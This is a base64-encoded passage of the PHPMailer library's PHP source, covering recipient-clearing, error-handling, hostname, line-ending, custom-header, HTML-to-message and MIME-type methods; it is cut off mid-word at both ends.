YWx0ZXJuYXRpdmUgYm9keSBzZXQuCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGFsdGVybmF0aXZlRXhpc3RzKCkKICAgIHsKICAgICAgICByZXR1cm4gIWVtcHR5KCR0aGlzLT5BbHRCb2R5KTsKICAgIH0KCiAgICAvKioKICAgICAqIENsZWFyIHF1ZXVlZCBhZGRyZXNzZXMgb2YgZ2l2ZW4ga2luZC4KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKiBAcGFyYW0gc3RyaW5nICRraW5kICd0bycsICdjYycsIG9yICdiY2MnCiAgICAgKiBAcmV0dXJuIHZvaWQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyUXVldWVkQWRkcmVzc2VzKCRraW5kKQogICAgewogICAgICAgICRSZWNpcGllbnRzUXVldWUgPSAkdGhpcy0+UmVjaXBpZW50c1F1ZXVlOwogICAgICAgIGZvcmVhY2ggKCRSZWNpcGllbnRzUXVldWUgYXMgJGFkZHJlc3MgPT4gJHBhcmFtcykgewogICAgICAgICAgICBpZiAoJHBhcmFtc1swXSA9PSAka2luZCkgewogICAgICAgICAgICAgICAgdW5zZXQoJHRoaXMtPlJlY2lwaWVudHNRdWV1ZVskYWRkcmVzc10pOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIC8qKgogICAgICogQ2xlYXIgYWxsIFRvIHJlY2lwaWVudHMuCiAgICAgKiBAcmV0dXJuIHZvaWQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyQWRkcmVzc2VzKCkKICAgIHsKICAgICAgICBmb3JlYWNoICgkdGhpcy0+dG8gYXMgJHRvKSB7CiAgICAgICAgICAgIHVuc2V0KCR0aGlzLT5hbGxfcmVjaXBpZW50c1tzdHJ0b2xvd2VyKCR0b1swXSldKTsKICAgICAgICB9CiAgICAgICAgJHRoaXMtPnRvID0gYXJyYXkoKTsKICAgICAgICAkdGhpcy0+Y2xlYXJRdWV1ZWRBZGRyZXNzZXMoJ3RvJyk7CiAgICB9CgogICAgLyoqCiAgICAgKiBDbGVhciBhbGwgQ0MgcmVjaXBpZW50cy4KICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xlYXJDQ3MoKQogICAgewogICAgICAgIGZvcmVhY2ggKCR0aGlzLT5jYyBhcyAkY2MpIHsKICAgICAgICAgICAgdW5zZXQoJHRoaXMtPmFsbF9yZWNpcGllbnRzW3N0cnRvbG93ZXIoJGNjWzBdKV0pOwogICAgICAgIH0KICAgICAgICAkdGhpcy0+Y2MgPSBhcnJheSgpOwogICAgICAgICR0aGlzLT5jbGVhclF1ZXVlZEFkZHJlc3NlcygnY2MnKTsKICAgIH0KCiAgICAvKioKICAgICAqIENsZWFyIGFsbCBCQ0MgcmVjaXBpZW50cy4KICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xlYXJCQ0NzKCkKICAgIHsKICAgICAgICBmb3JlYWNoICgkdGhpcy0+YmNjIGFzICRiY2MpIHsKICAgICAgICAgICAgdW5zZXQoJHRoaXMtPmFsbF9yZWNpcGllbnRzW3N0cnRvbG93ZXIoJGJjY1swXSldKTsKICAgICAgICB9CiAgICAgICAgJHRoaXMtPmJjYyA9IGFycmF5KCk7CiAgICAgICAgJHRoaXMtPmNsZWFyUXVldWVkQWRkcmVzc2VzKCdiY2MnKTsKICAgIH0KCiAgICAvKioKICAgICAqIENsZWFyIGFsbCBSZXBseVRvIHJlY2lwaWVudHMuCiAgICAgKiBAcmV0dXJuIHZvaWQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyUmVwbHlUb3MoKQogICAgewogICAgICAgICR0aGlzLT5SZXBseVRvID0gYXJyYXkoKTsKICAgICAgICAkdGhpcy0+UmVwbHlUb1F1ZXVlID0gYXJyYXkoKTsKICAgIH0KCiAgICAvKioKICAgICAqIENsZWFyIGFsbCByZWNpcGllbnQgdHlwZXMuCiAgICAgKiBAcmV0dXJuIHZvaWQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyQWxsUmVjaXBpZW50cygpCiAgICB7CiAgICAgICAgJHRoaXMtPnRvID0gYXJyYXkoKTsKICAgICAgICAkdGhpcy0+Y2MgPSBhcnJheSgpOwogICAgICAgICR0aGlzLT5iY2MgPSBhcnJheSgpOwogICAgICAgICR0aGlzLT5hbGxfcmVjaXBpZW50cyA9IGFycmF5KCk7CiAgICAgICAgJHRoaXMtPlJlY2lwaWVudHNRdWV1ZSA9IGFycmF5KCk7CiAgICB9CgogICAgLyoqCiAgICAgKiBDbGVhciBhbGwgZmlsZXN5c3RlbSwgc3RyaW5nLCBhbmQgYmluYXJ5IGF0dGFjaG1lbnRzLgogICAgICogQHJldHVybiB2b2lkCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBjbGVhckF0dGFjaG1lbnRzKCkKICAgIHsKICAgICAgICAkdGhpcy0+YXR0YWNobWVudCA9IGFycmF5KCk7CiAgICB9CgogICAgLyoqCiAgICAgKiBDbGVhciBhbGwgY3VzdG9tIGhlYWRlcnMuCiAgICAgKiBAcmV0dXJuIHZvaWQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyQ3VzdG9tSGVhZGVycygpCiAgICB7CiAgICAgICAgJHRoaXMtPkN1c3RvbUhlYWRlciA9IGFycmF5KCk7CiAgICB9CgogICAgLyoqCiAgICAgKiBBZGQgYW4gZXJyb3IgbWVzc2FnZSB0byB0aGUgZXJyb3IgY29udGFpbmVyLgogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqIEBwYXJhbSBzdHJpbmcgJG1zZwogICAgICogQHJldHVybiB2b2lkCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBzZXRFcnJvcigkbXNnKQogICAgewogICAgICAgICR0aGlzLT5lcnJvcl9jb3VudCsrOwogICAgICAgIGlmICgkdGhpcy0+TWFpbGVyID09ICdzbXRwJyBhbmQgIWlzX251bGwoJHRoaXMtPnNtdHApKSB7CiAgICAgICAgICAgICRsYXN0ZXJyb3IgPSAkdGhpcy0+c210cC0+Z2V0RXJyb3IoKTsKICAgICAgICAgICAgaWYgKCFlbXB0eSgkbGFzdGVycm9yWydlcnJvciddKSkgewogICAgICAgICAgICAgICAgJG1zZyAuPSAkdGhpcy0+bGFuZygnc210cF9lcnJvcicpIC4gJGxhc3RlcnJvclsnZXJyb3InXTsKICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJGxhc3RlcnJvclsnZGV0YWlsJ10pKSB7CiAgICAgICAgICAgICAgICAgICAgJG1zZyAuPSAnIERldGFpbDogJy4gJGxhc3RlcnJvclsnZGV0YWlsJ107CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoIWVtcHR5KCRsYXN0ZXJyb3JbJ3NtdHBfY29kZSddKSkgewogICAgICAgICAgICAgICAgICAgICRtc2cgLj0gJyBTTVRQIGNvZGU6ICcgLiAkbGFzdGVycm9yWydzbXRwX2NvZGUnXTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJGxhc3RlcnJvclsnc210cF9jb2RlX2V4J10pKSB7CiAgICAgICAgICAgICAgICAgICAgJG1zZyAuPSAnIEFkZGl0aW9uYWwgU01UUCBpbmZvOiAnIC4gJGxhc3RlcnJvclsnc210cF9jb2RlX2V4J107CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJHRoaXMtPkVycm9ySW5mbyA9ICRtc2c7CiAgICB9CgogICAgLyoqCiAgICAgKiBSZXR1cm4gYW4gUkZDIDgyMiBmb3JtYXR0ZWQgZGF0ZS4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICogQHN0YXRpYwogICAgICovCiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIHJmY0RhdGUoKQogICAgewogICAgICAgIC8vIFNldCB0aGUgdGltZSB6b25lIHRvIHdoYXRldmVyIHRoZSBkZWZhdWx0IGlzIHRvIGF2b2lkIDUwMCBlcnJvcnMKICAgICAgICAvLyBXaWxsIGRlZmF1bHQgdG8gVVRDIGlmIGl0J3Mgbm90IHNldCBwcm9wZXJseSBpbiBwaHAuaW5pCiAgICAgICAgZGF0ZV9kZWZhdWx0X3RpbWV6b25lX3NldChAZGF0ZV9kZWZhdWx0X3RpbWV6b25lX2dldCgpKTsKICAgICAgICByZXR1cm4gZGF0ZSgnRCwgaiBNIFkgSDppOnMgTycpOwogICAgfQoKICAgIC8qKgogICAgICogR2V0IHRoZSBzZXJ2ZXIgaG9zdG5hbWUuCiAgICAgKiBSZXR1cm5zICdsb2NhbGhvc3QubG9jYWxkb21haW4nIGlmIHVua25vd24uCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIHNlcnZlckhvc3RuYW1lKCkKICAgIHsKICAgICAgICAkcmVzdWx0ID0gJ2xvY2FsaG9zdC5sb2NhbGRvbWFpbic7CiAgICAgICAgaWYgKCFlbXB0eSgkdGhpcy0+SG9zdG5hbWUpKSB7CiAgICAgICAgICAgICRyZXN1bHQgPSAkdGhpcy0+SG9zdG5hbWU7CiAgICAgICAgfSBlbHNlaWYgKGlzc2V0KCRfU0VSVkVSKSBhbmQgYXJyYXlfa2V5X2V4aXN0cygnU0VSVkVSX05BTUUnLCAkX1NFUlZFUikgYW5kICFlbXB0eSgkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSkpIHsKICAgICAgICAgICAgJHJlc3VsdCA9ICRfU0VSVkVSWydTRVJWRVJfTkFNRSddOwogICAgICAgIH0gZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoJ2dldGhvc3RuYW1lJykgJiYgZ2V0aG9zdG5hbWUoKSAhPT0gZmFsc2UpIHsKICAgICAgICAgICAgJHJlc3VsdCA9IGdldGhvc3RuYW1lKCk7CiAgICAgICAgfSBlbHNlaWYgKHBocF91bmFtZSgnbicpICE9PSBmYWxzZSkgewogICAgICAgICAgICAkcmVzdWx0ID0gcGhwX3VuYW1lKCduJyk7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkcmVzdWx0OwogICAgfQoKICAgIC8qKgogICAgICogR2V0IGFuIGVycm9yIG1lc3NhZ2UgaW4gdGhlIGN1cnJlbnQgbGFuZ3VhZ2UuCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICogQHBhcmFtIHN0cmluZyAka2V5CiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gbGFuZygka2V5KQogICAgewogICAgICAgIGlmIChjb3VudCgkdGhpcy0+bGFuZ3VhZ2UpIDwgMSkgewogICAgICAgICAgICAkdGhpcy0+c2V0TGFuZ3VhZ2UoJ2VuJyk7IC8vIHNldCB0aGUgZGVmYXVsdCBsYW5ndWFnZQogICAgICAgIH0KCiAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoJGtleSwgJHRoaXMtPmxhbmd1YWdlKSkgewogICAgICAgICAgICBpZiAoJGtleSA9PSAnc210cF9jb25uZWN0X2ZhaWxlZCcpIHsKICAgICAgICAgICAgICAgIC8vSW5jbHVkZSBhIGxpbmsgdG8gdHJvdWJsZXNob290aW5nIGRvY3Mgb24gU01UUCBjb25uZWN0aW9uIGZhaWx1cmUKICAgICAgICAgICAgICAgIC8vdGhpcyBpcyBieSBmYXIgdGhlIGJpZ2dlc3QgY2F1c2Ugb2Ygc3VwcG9ydCBxdWVzdGlvbnMKICAgICAgICAgICAgICAgIC8vYnV0IGl0J3MgdXN1YWxseSBub3QgUEhQTWFpbGVyJ3MgZmF1bHQuCiAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPmxhbmd1YWdlWyRrZXldIC4gJyBodHRwczovL2dpdGh1Yi5jb20vUEhQTWFpbGVyL1BIUE1haWxlci93aWtpL1Ryb3VibGVzaG9vdGluZyc7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5sYW5ndWFnZVska2V5XTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAvL1JldHVybiB0aGUga2V5IGFzIGEgZmFsbGJhY2sKICAgICAgICAgICAgcmV0dXJuICRrZXk7CiAgICAgICAgfQogICAgfQoKICAgIC8qKgogICAgICogQ2hlY2sgaWYgYW4gZXJyb3Igb2NjdXJyZWQuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHJldHVybiBib29sZWFuIFRydWUgaWYgYW4gZXJyb3IgZGlkIG9jY3VyLgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gaXNFcnJvcigpCiAgICB7CiAgICAgICAgcmV0dXJuICgkdGhpcy0+ZXJyb3JfY291bnQgPiAwKTsKICAgIH0KCiAgICAvKioKICAgICAqIEVuc3VyZSBjb25zaXN0ZW50IGxpbmUgZW5kaW5ncyBpbiBhIHN0cmluZy4KICAgICAqIENoYW5nZXMgZXZlcnkgZW5kIG9mIGxpbmUgZnJvbSBDUkxGLCBDUiBvciBMRiB0byAkdGhpcy0+TEUuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHBhcmFtIHN0cmluZyAkc3RyIFN0cmluZyB0byBmaXhFT0wKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBmaXhFT0woJHN0cikKICAgIHsKICAgICAgICAvLyBOb3JtYWxpc2UgdG8gXG4KICAgICAgICAkbnN0ciA9IHN0cl9yZXBsYWNlKGFycmF5KCJcclxuIiwgIlxyIiksICJcbiIsICRzdHIpOwogICAgICAgIC8vIE5vdyBjb252ZXJ0IExFIGFzIG5lZWRlZAogICAgICAgIGlmICgkdGhpcy0+TEUgIT09ICJcbiIpIHsKICAgICAgICAgICAgJG5zdHIgPSBzdHJfcmVwbGFjZSgiXG4iLCAkdGhpcy0+TEUsICRuc3RyKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICRuc3RyOwogICAgfQoKICAgIC8qKgogICAgICogQWRkIGEgY3VzdG9tIGhlYWRlci4KICAgICAqICRuYW1lIHZhbHVlIGNhbiBiZSBvdmVybG9hZGVkIHRvIGNvbnRhaW4KICAgICAqIGJvdGggaGVhZGVyIG5hbWUgYW5kIHZhbHVlIChuYW1lOnZhbHVlKQogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUgQ3VzdG9tIGhlYWRlciBuYW1lCiAgICAgKiBAcGFyYW0gc3RyaW5nICR2YWx1ZSBIZWFkZXIgdmFsdWUKICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkQ3VzdG9tSGVhZGVyKCRuYW1lLCAkdmFsdWUgPSBudWxsKQogICAgewogICAgICAgIGlmICgkdmFsdWUgPT09IG51bGwpIHsKICAgICAgICAgICAgLy8gVmFsdWUgcGFzc2VkIGluIGFzIG5hbWU6dmFsdWUKICAgICAgICAgICAgJHRoaXMtPkN1c3RvbUhlYWRlcltdID0gZXhwbG9kZSgnOicsICRuYW1lLCAyKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkdGhpcy0+Q3VzdG9tSGVhZGVyW10gPSBhcnJheSgkbmFtZSwgJHZhbHVlKTsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBSZXR1cm5zIGFsbCBjdXN0b20gaGVhZGVycy4KICAgICAqIEByZXR1cm4gYXJyYXkKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGdldEN1c3RvbUhlYWRlcnMoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+Q3VzdG9tSGVhZGVyOwogICAgfQoKICAgIC8qKgogICAgICogQ3JlYXRlIGEgbWVzc2FnZSBmcm9tIGFuIEhUTUwgc3RyaW5nLgogICAgICogQXV0b21hdGljYWxseSBtYWtlcyBtb2RpZmljYXRpb25zIGZvciBpbmxpbmUgaW1hZ2VzIGFuZCBiYWNrZ3JvdW5kcwogICAgICogYW5kIGNyZWF0ZXMgYSBwbGFpbi10ZXh0IHZlcnNpb24gYnkgY29udmVydGluZyB0aGUgSFRNTC4KICAgICAqIE92ZXJ3cml0ZXMgYW55IGV4aXN0aW5nIHZhbHVlcyBpbiAkdGhpcy0+Qm9keSBhbmQgJHRoaXMtPkFsdEJvZHkKICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gc3RyaW5nICRtZXNzYWdlIEhUTUwgbWVzc2FnZSBzdHJpbmcKICAgICAqIEBwYXJhbSBzdHJpbmcgJGJhc2VkaXIgYmFzZWxpbmUgZGlyZWN0b3J5IGZvciBwYXRoCiAgICAgKiBAcGFyYW0gYm9vbGVhbnxjYWxsYWJsZSAkYWR2YW5jZWQgV2hldGhlciB0byB1c2UgdGhlIGludGVybmFsIEhUTUwgdG8gdGV4dCBjb252ZXJ0ZXIKICAgICAqICAgIG9yIHlvdXIgb3duIGN1c3RvbSBjb252ZXJ0ZXIgQHNlZSBQSFBNYWlsZXI6Omh0bWwydGV4dCgpCiAgICAgKiBAcmV0dXJuIHN0cmluZyAkbWVzc2FnZQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gbXNnSFRNTCgkbWVzc2FnZSwgJGJhc2VkaXIgPSAnJywgJGFkdmFuY2VkID0gZmFsc2UpCiAgICB7CiAgICAgICAgcHJlZ19tYXRjaF9hbGwoJy8oc3JjfGJhY2tncm91bmQpPVsiXCddKC4qKVsiXCddL1VpJywgJG1lc3NhZ2UsICRpbWFnZXMpOwogICAgICAgIGlmIChhcnJheV9rZXlfZXhpc3RzKDIsICRpbWFnZXMpKSB7CiAgICAgICAgICAgIGZvcmVhY2ggKCRpbWFnZXNbMl0gYXMgJGltZ2luZGV4ID0+ICR1cmwpIHsKICAgICAgICAgICAgICAgIC8vIENvbnZlcnQgZGF0YSBVUklzIGludG8gZW1iZWRkZWQgaW1hZ2VzCiAgICAgICAgICAgICAgICBpZiAocHJlZ19tYXRjaCgnI15kYXRhOihpbWFnZVteOyxdKikoO2Jhc2U2NCk/LCMnLCAkdXJsLCAkbWF0Y2gpKSB7CiAgICAgICAgICAgICAgICAgICAgJGRhdGEgPSBzdWJzdHIoJHVybCwgc3RycG9zKCR1cmwsICcsJykpOwogICAgICAgICAgICAgICAgICAgIGlmICgkbWF0Y2hbMl0pIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGRhdGEgPSBiYXNlNjRfZGVjb2RlKCRkYXRhKTsKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkZGF0YSA9IHJhd3VybGRlY29kZSgkZGF0YSk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRjaWQgPSBtZDUoJHVybCkgLiAnQHBocG1haWxlci4wJzsgLy8gUkZDMjM5MiBTIDIKICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPmFkZFN0cmluZ0VtYmVkZGVkSW1hZ2UoJGRhdGEsICRjaWQsICdlbWJlZCcgLiAkaW1naW5kZXgsICdiYXNlNjQnLCAkbWF0Y2hbMV0pKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlID0gc3RyX3JlcGxhY2UoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW1hZ2VzWzBdWyRpbWdpbmRleF0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW1hZ2VzWzFdWyRpbWdpbmRleF0gLiAnPSJjaWQ6JyAuICRjaWQgLiAnIicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbWVzc2FnZQogICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gZWxzZWlmIChzdWJzdHIoJHVybCwgMCwgNCkgIT09ICdjaWQ6JyAmJiAhcHJlZ19tYXRjaCgnI15bQS16XSs6Ly8jJywgJHVybCkpIHsKICAgICAgICAgICAgICAgICAgICAvLyBEbyBub3QgY2hhbmdlIHVybHMgZm9yIGFic29sdXRlIGltYWdlcyAodGhhbmtzIHRvIGNvcnZ1c2NvcmF4KQogICAgICAgICAgICAgICAgICAgIC8vIERvIG5vdCBjaGFuZ2UgdXJscyB0aGF0IGFyZSBhbHJlYWR5IGlubGluZSBpbWFnZXMKICAgICAgICAgICAgICAgICAgICAkZmlsZW5hbWUgPSBiYXNlbmFtZSgkdXJsKTsKICAgICAgICAgICAgICAgICAgICAkZGlyZWN0b3J5ID0gZGlybmFtZSgkdXJsKTsKICAgICAgICAgICAgICAgICAgICBpZiAoJGRpcmVjdG9yeSA9PSAnLicpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGRpcmVjdG9yeSA9ICcnOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkY2lkID0gbWQ1KCR1cmwpIC4gJ0BwaHBtYWlsZXIuMCc7IC8vIFJGQzIzOTIgUyAyCiAgICAgICAgICAgICAgICAgICAgaWYgKHN0cmxlbigkYmFzZWRpcikgPiAxICYmIHN1YnN0cigkYmFzZWRpciwgLTEpICE9ICcvJykgewogICAgICAgICAgICAgICAgICAgICAgICAkYmFzZWRpciAuPSAnLyc7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmIChzdHJsZW4oJGRpcmVjdG9yeSkgPiAxICYmIHN1YnN0cigkZGlyZWN0b3J5LCAtMSkgIT0gJy8nKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRkaXJlY3RvcnkgLj0gJy8nOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPmFkZEVtYmVkZGVkSW1hZ2UoCiAgICAgICAgICAgICAgICAgICAgICAgICRiYXNlZGlyIC4gJGRpcmVjdG9yeSAuICRmaWxlbmFtZSwKICAgICAgICAgICAgICAgICAgICAgICAgJGNpZCwKICAgICAgICAgICAgICAgICAgICAgICAgJGZpbGVuYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAnYmFzZTY0JywKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZjo6X21pbWVfdHlwZXMoKHN0cmluZylzZWxmOjptYl9wYXRoaW5mbygkZmlsZW5hbWUsIFBBVEhJTkZPX0VYVEVOU0lPTikpCiAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgICAgICkgewogICAgICAgICAgICAgICAgICAgICAgICAkbWVzc2FnZSA9IHByZWdfcmVwbGFjZSgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICcvJyAuICRpbWFnZXNbMV1bJGltZ2luZGV4XSAuICc9WyJcJ10nIC4gcHJlZ19xdW90ZSgkdXJsLCAnLycpIC4gJ1siXCddL1VpJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbWFnZXNbMV1bJGltZ2luZGV4XSAuICc9ImNpZDonIC4gJGNpZCAuICciJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlCiAgICAgICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICR0aGlzLT5pc0hUTUwodHJ1ZSk7CiAgICAgICAgLy8gQ29udmVydCBhbGwgbWVzc2FnZSBib2R5IGxpbmUgYnJlYWtzIHRvIENSTEYsIG1ha2VzIHF1b3RlZC1wcmludGFibGUgZW5jb2Rpbmcgd29yayBtdWNoIGJldHRlcgogICAgICAgICR0aGlzLT5Cb2R5ID0gJHRoaXMtPm5vcm1hbGl6ZUJyZWFrcygkbWVzc2FnZSk7CiAgICAgICAgJHRoaXMtPkFsdEJvZHkgPSAkdGhpcy0+bm9ybWFsaXplQnJlYWtzKCR0aGlzLT5odG1sMnRleHQoJG1lc3NhZ2UsICRhZHZhbmNlZCkpOwogICAgICAgIGlmIChlbXB0eSgkdGhpcy0+QWx0Qm9keSkpIHsKICAgICAgICAgICAgJHRoaXMtPkFsdEJvZHkgPSAnVG8gdmlldyB0aGlzIGVtYWlsIG1lc3NhZ2UsIG9wZW4gaXQgaW4gYSBwcm9ncmFtIHRoYXQgdW5kZXJzdGFuZHMgSFRNTCEnIC4KICAgICAgICAgICAgICAgIHNlbGY6OkNSTEYgLiBzZWxmOjpDUkxGOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJHRoaXMtPkJvZHk7CiAgICB9CgogICAgLyoqCiAgICAgKiBDb252ZXJ0IGFuIEhUTUwgc3RyaW5nIGludG8gcGxhaW4gdGV4dC4KICAgICAqIFRoaXMgaXMgdXNlZCBieSBtc2dIVE1MKCkuCiAgICAgKiBOb3RlIC0gb2xkZXIgdmVyc2lvbnMgb2YgdGhpcyBmdW5jdGlvbiB1c2VkIGEgYnVuZGxlZCBhZHZhbmNlZCBjb252ZXJ0ZXIKICAgICAqIHdoaWNoIHdhcyBiZWVuIHJlbW92ZWQgZm9yIGxpY2Vuc2UgcmVhc29ucyBpbiAjMjMyCiAgICAgKiBFeGFtcGxlIHVzYWdlOgogICAgICogPGNvZGU+CiAgICAgKiAvLyBVc2UgZGVmYXVsdCBjb252ZXJzaW9uCiAgICAgKiAkcGxhaW4gPSAkbWFpbC0+aHRtbDJ0ZXh0KCRodG1sKTsKICAgICAqIC8vIFVzZSB5b3VyIG93biBjdXN0b20gY29udmVydGVyCiAgICAgKiAkcGxhaW4gPSAkbWFpbC0+aHRtbDJ0ZXh0KCRodG1sLCBmdW5jdGlvbigkaHRtbCkgewogICAgICogICAgICRjb252ZXJ0ZXIgPSBuZXcgTXlIdG1sMnRleHQoJGh0bWwpOwogICAgICogICAgIHJldHVybiAkY29udmVydGVyLT5nZXRfdGV4dCgpOwogICAgICogfSk7CiAgICAgKiA8L2NvZGU+CiAgICAgKiBAcGFyYW0gc3RyaW5nICRodG1sIFRoZSBIVE1MIHRleHQgdG8gY29udmVydAogICAgICogQHBhcmFtIGJvb2xlYW58Y2FsbGFibGUgJGFkdmFuY2VkIEFueSBib29sZWFuIHZhbHVlIHRvIHVzZSB0aGUgaW50ZXJuYWwgY29udmVydGVyLAogICAgICogICBvciBwcm92aWRlIHlvdXIgb3duIGNhbGxhYmxlIGZvciBjdXN0b20gY29udmVyc2lvbi4KICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBodG1sMnRleHQoJGh0bWwsICRhZHZhbmNlZCA9IGZhbHNlKQogICAgewogICAgICAgIGlmIChpc19jYWxsYWJsZSgkYWR2YW5jZWQpKSB7CiAgICAgICAgICAgIHJldHVybiBjYWxsX3VzZXJfZnVuYygkYWR2YW5jZWQsICRodG1sKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIGh0bWxfZW50aXR5X2RlY29kZSgKICAgICAgICAgICAgdHJpbShzdHJpcF90YWdzKHByZWdfcmVwbGFjZSgnLzwoaGVhZHx0aXRsZXxzdHlsZXxzY3JpcHQpW14+XSo+Lio/PFwvXFwxPi9zaScsICcnLCAkaHRtbCkpKSwKICAgICAgICAgICAgRU5UX1FVT1RFUywKICAgICAgICAgICAgJHRoaXMtPkNoYXJTZXQKICAgICAgICApOwogICAgfQoKICAgIC8qKgogICAgICogR2V0IHRoZSBNSU1FIHR5cGUgZm9yIGEgZmlsZSBleHRlbnNpb24uCiAgICAgKiBAcGFyYW0gc3RyaW5nICRleHQgRmlsZSBleHRlbnNpb24KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcmV0dXJuIHN0cmluZyBNSU1FIHR5cGUgb2YgZmlsZS4KICAgICAqIEBzdGF0aWMKICAgICAqLwogICAgcHVibGljIHN0YXRpYyBmdW5jdGlvbiBfbWltZV90eXBlcygkZXh0ID0gJycpCiAgICB7CiAgICAgICAgJG1pbWVzID0gYXJyYXkoCiAgICAgICAgICAgICd4bCcgICAgPT4gJ2FwcGxpY2F0aW9uL2V4Y2VsJywKICAgICAgICAgICAgJ2pzJyAgICA9PiAnYXBwbGljYXRpb24vamF2YXNjcmlwdCcsCiAgICAgICAgICAgICdocXgnICAgPT4gJ2FwcGxpY2F0aW9uL21hYy1iaW5oZXg0MCcsCiAgICAgICAgICAgICdjcHQnICAgPT4gJ2FwcGxpY2F0aW9uL21hYy1jb21wYWN0cHJvJywKICAgICAgICAgICAgJ2JpbicgICA9PiAnYXBwbGljYXRpb24vbWFjYmluYXJ5JywKICAgICAgICAgICAgJ2RvYycgICA9PiAnYXBwbGljYXRpb24vbXN3b3JkJywKICAgICAgICAgICAgJ3dvcmQnICA9PiAnYXBwbGljYXRpb24vbXN3b3JkJywKICAgICAgICAgICAgJ3hsc3gnICA9PiAnYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LnNwcmVhZHNoZWV0bWwuc2hlZXQnLAogICAgICAgICAgICAneGx0eCcgID0+ICdhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQuc3ByZWFkc2hlZXRtbC50ZW1wbGF0ZScsCiAgICAgICAgICAgICdwb3R4JyAgPT4gJ2FwcGxpY2F0aW9uL3Zu